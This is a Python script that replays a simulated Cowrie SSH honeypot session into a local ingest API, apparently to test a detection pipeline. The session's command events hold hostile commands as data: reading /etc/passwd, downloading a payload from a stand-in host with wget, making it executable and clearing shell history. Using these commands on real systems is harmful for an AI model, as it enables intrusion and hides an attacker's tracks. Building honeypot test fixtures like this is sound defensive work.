"""Send a realistic Cowrie session to the production ingest API.

The script uses only the Python standard library and posts the JSON format
accepted by production.api.ingest_api:

    {"sensor_id": "...", "events": [...]}

It never prints the API token.
"""

from __future__ import annotations

import argparse
import json
import os
import sys
import time
import urllib.error
import urllib.request
import uuid
from datetime import datetime, timedelta, timezone
from typing import Any, Dict, List, Optional


def utc_timestamp(offset_seconds: int = 0) -> str:
    value = datetime.now(timezone.utc).replace(microsecond=0) + timedelta(seconds=offset_seconds)
    return value.isoformat().replace("+00:00", "Z")


def build_events(args: argparse.Namespace, session_id: str) -> List[Dict[str, Any]]:
    sensor = args.sensor
    src_ip = args.src_ip
    dst_ip = args.dst_ip
    src_port = args.src_port
    dst_port = args.dst_port
    protocol = args.protocol
    username = args.username
    password = args.password

    events: List[Dict[str, Any]] = [
        {
            "eventid": "cowrie.session.connect",
            "src_ip": src_ip,
            "src_port": src_port,
            "dst_ip": dst_ip,
            "dst_port": dst_port,
            "session": session_id,
            "protocol": protocol,
            "sensor": sensor,
            "timestamp": utc_timestamp(0),
            "message": f"New connection: {src_ip}:{src_port} ({dst_ip}:{dst_port}) [session: {session_id}]",
        },
        {
            "eventid": "cowrie.client.version",
            "version": args.client_version,
            "src_ip": src_ip,
            "session": session_id,
            "sensor": sensor,
            "timestamp": utc_timestamp(2),
            "message": f"Remote SSH version: {args.client_version}",
        },
        {
            "eventid": "cowrie.client.kex",
            "hassh": args.hassh,
            "kexAlgs": ["curve25519-sha256", "diffie-hellman-group14-sha1"],
            "keyAlgs": ["ssh-rsa", "rsa-sha2-256"],
            "encCS": ["aes128-ctr", "aes256-ctr"],
            "macCS": ["hmac-sha2-256", "hmac-sha1"],
            "src_ip": src_ip,
            "session": session_id,
            "sensor": sensor,
            "timestamp": utc_timestamp(3),
            "message": "SSH key exchange fingerprint recorded",
        },
        {
            "eventid": "cowrie.login.success",
            "username": username,
            "password": password,
            "src_ip": src_ip,
            "session": session_id,
            "sensor": sensor,
            "timestamp": utc_timestamp(5),
            "message": f"login attempt [{username}/{password}] succeeded",
        },
    ]

    command_events = [
        ("whoami", 8),
        ("cat /etc/passwd", 12),
        ("wget http://example.com/payload.sh -O /tmp/p.sh", 16),
        ("chmod +x /tmp/p.sh", 20),
        ("history -c", 24),
    ]
    for command, offset in command_events:
        events.append(
            {
                "eventid": "cowrie.command.input",
                "input": command,
                "src_ip": src_ip,
                "session": session_id,
                "sensor": sensor,
                "timestamp": utc_timestamp(offset),
                "message": f"CMD: {command}",
            }
        )

    events.append(
        {
            "eventid": "cowrie.session.file_download",
            "duplicate": False,
            "outfile": "var/lib/cowrie/downloads/4f2957f1a08e4c125bdb7f2a884d4c5a2f95a4d0067cbb0d123456789abcdef0",
            "shasum": "4f2957f1a08e4c125bdb7f2a884d4c5a2f95a4d0067cbb0d123456789abcdef0",
            "destfile": "/tmp/p.sh",
            "src_ip": src_ip,
            "session": session_id,
            "sensor": sensor,
            "timestamp": utc_timestamp(26),
            "message": "Saved downloaded payload to var/lib/cowrie/downloads/4f2957f1a08e4c125bdb7f2a884d4c5a2f95a4d0067cbb0d123456789abcdef0",
        }
    )

    if not args.active_only:
        events.append(
            {
                "eventid": "cowrie.session.closed",
                "duration": "32.0",
                "src_ip": src_ip,
                "session": session_id,
                "sensor": sensor,
                "timestamp": utc_timestamp(32),
                "message": "Connection lost after 32.0 seconds",
            }
        )

    return events


def post_events(url: str, token: str, sensor_id: str, events: List[Dict[str, Any]], timeout: float) -> Dict[str, Any]:
    body = json.dumps({"sensor_id": sensor_id, "events": events}, sort_keys=True).encode("utf-8")
    headers = {
        "Content-Type": "application/json",
        "X-Sensor-ID": sensor_id,
    }
    if token:
        headers["Authorization"] = f"Bearer {token}"
    request = urllib.request.Request(url, data=body, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            response_body = response.read().decode("utf-8")
            parsed = json.loads(response_body) if response_body else {}
            parsed["http_status"] = response.status
            return parsed
    except urllib.error.HTTPError as exc:
        error_body = exc.read().decode("utf-8", errors="replace")
        raise RuntimeError(f"HTTP {exc.code}: {error_body}") from exc
    except urllib.error.URLError as exc:
        raise RuntimeError(f"Unable to reach ingest API: {exc}") from exc


def build_arg_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Replay a realistic Cowrie session into the ingest API.")
    parser.add_argument("--url", default="http://127.0.0.1:8080/events", help="Ingest API /events URL.")
    parser.add_argument("--token", default=os.getenv("HONEYPOT_API_TOKEN", ""), help="API bearer token. Defaults to HONEYPOT_API_TOKEN.")
    parser.add_argument("--sensor", default="demo-cloud-pipeline", help="Sensor id to attach to the demo events.")
    parser.add_argument("--session-id", default="", help="Optional session id. Defaults to demo-final-<timestamp>-<short uuid>.")
    parser.add_argument("--src-ip", default="198.51.100.45", help="Documentation-range source IP to simulate.")
    parser.add_argument("--dst-ip", default="192.0.2.5", help="Documentation-range destination IP to simulate.")
    parser.add_argument("--src-port", type=int, default=53321, help="Source TCP port.")
    parser.add_argument("--dst-port", type=int, default=22, help="Destination TCP port.")
    parser.add_argument("--protocol", default="ssh", help="Cowrie protocol.")
    parser.add_argument("--username", default="root", help="Login username to simulate.")
    parser.add_argument("--password", default="test", help="Login password to simulate.")
    parser.add_argument("--client-version", default="SSH-2.0-OpenSSH_7.4", help="SSH client banner.")
    parser.add_argument("--hassh", default="demo-hassh-final-architecture", help="HASSH value to simulate.")
    parser.add_argument("--timeout", type=float, default=10.0, help="HTTP timeout in seconds.")
    parser.add_argument("--active-only", action="store_true", help="Do not send cowrie.session.closed.")
    parser.add_argument("--print-only", action="store_true", help="Print the JSON payload without sending it.")
    return parser


def main(argv: Optional[List[str]] = None) -> int:
    args = build_arg_parser().parse_args(argv)
    session_id = args.session_id or f"demo-final-{int(time.time())}-{uuid.uuid4().hex[:6]}"
    events = build_events(args, session_id)
    payload = {"sensor_id": args.sensor, "events": events}

    if args.print_only:
        print(json.dumps(payload, indent=2, sort_keys=True))
        return 0

    try:
        response = post_events(args.url, args.token, args.sensor, events, args.timeout)
    except RuntimeError as exc:
        print(json.dumps({"ok": False, "error": str(exc), "session_id": session_id}, sort_keys=True), file=sys.stderr)
        return 1

    print(
        json.dumps(
            {
                "ok": True,
                "session_id": session_id,
                "sensor_id": args.sensor,
                "event_count": len(events),
                "ingest_response": response,
                "next_checks": {
                    "prediction": f"curl -sS 'http://127.0.0.1:8081/predictions/current?session_id={session_id}'",
                    "monitor": f"http://127.0.0.1:8090/?session_id={session_id}",
                    "reports": "curl -sS 'http://127.0.0.1:8081/reports'",
                    "alerts": "curl -sS 'http://127.0.0.1:8081/alerts'",
                },
            },
            indent=2,
            sort_keys=True,
        )
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
